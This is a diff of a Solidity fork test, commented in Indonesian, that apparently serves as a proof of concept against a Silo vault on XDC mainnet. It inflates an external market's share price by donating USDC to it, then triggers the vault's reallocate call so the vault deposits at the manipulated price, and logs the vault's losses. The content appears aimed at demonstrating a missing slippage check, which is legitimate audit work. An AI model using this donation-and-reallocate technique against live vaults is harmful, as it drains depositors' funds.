@@ -36,13 +36,11 @@ contract SiloXDCForkTest is Test {
         console.log("Vault TVL Sebelum Serangan :", vaultTVLBefore);
         
         address attacker = address(this);
-        // USDC menggunakan 6 Desimal, kita beri attacker 10 Juta USDC
-        deal(USDC, attacker, 10_000_000 * 1e6); 
+        deal(USDC, attacker, 10_000_000 * 1e6); // 10 Juta USDC
 
         console.log("\n[1] FRONT-RUN: Attacker mendonasi uang ke External Market untuk memanipulasi harga...");
         vm.startPrank(attacker);
-        // Pompa harga Share Token dengan mengirim 5 Juta USDC langsung (Spot Balance Attack)
-        IERC20(USDC).transfer(EXTERNAL_MARKET, 5_000_000 * 1e6);
+        IERC20(USDC).transfer(EXTERNAL_MARKET, 5_000_000 * 1e6); // Kirim 5 Juta USDC
         vm.stopPrank();
 
         console.log("\n[2] EKSEKUSI VAULT: Allocator memindahkan dana dari Source Market ke External Market...");
@@ -50,16 +48,25 @@ contract SiloXDCForkTest is Test {
         
         ISiloVault.MarketAllocation[] memory allocations = new ISiloVault.MarketAllocation[](2);
         
-        // PERUBAHAN DI SINI: Tarik hanya 10,000 USDC dari Source Market agar tidak kena NotEnoughLiquidity
+        // --- PERHITUNGAN DINAMIS ---
+        // Baca saldo Vault di Source Market saat ini
+        uint256 sourceShares = IERC20(SOURCE_MARKET).balanceOf(SILO_VAULT);
+        uint256 currentSupplyAssets = IERC4626(SOURCE_MARKET).convertToAssets(sourceShares);
+        
+        // Kita hanya ingin menarik 1,000 USDC. Pasti ada cukup likuiditas!
+        uint256 withdrawAmount = 1_000 * 1e6; 
+        uint256 targetAssetsToLeave = currentSupplyAssets - withdrawAmount;
+        
+        // 1. Tarik 1,000 USDC
         allocations[0] = ISiloVault.MarketAllocation({
             market: IERC4626(SOURCE_MARKET),
-            assets: 10_000 * 1e6 // 10 Ribu USDC
+            assets: targetAssetsToLeave // Menyuruh Vault menyisakan (Saldo - 1000)
         });
         
-        // Setorkan semua dana (10,000 USDC tadi) ke External Market yang sudah kita manipulasi
+        // 2. Setorkan 1,000 USDC ke External Market yang harganya sudah kita manipulasi
         allocations[1] = ISiloVault.MarketAllocation({
             market: IERC4626(EXTERNAL_MARKET),
-            assets: type(uint256).max // type(max) berarti deposit semua sisa dari totalWithdrawn
+            assets: type(uint256).max // Setor semua hasil tarikan tadi
         });
         
         // Eksekusi fungsi reallocate!
@@ -75,7 +82,7 @@ contract SiloXDCForkTest is Test {
             console.log("[+] Vault kehilangan:", vaultTVLBefore - vaultTVLAfter, "USDC");
             console.log("[+] Bukti konkret bahwa ketiadaan slippage protection menghancurkan dana Vault di Mainnet!");
         } else {
-            console.log("\n[-] Gagal. TVL tidak berubah atau bertambah. Market mungkin kebal Flash Loan (menggunakan Oracle/Internal Accounting).");
+            console.log("\n[-] Gagal. TVL tidak berubah atau bertambah. Market kebal dari Spot Donation.");
         }
     }
 }
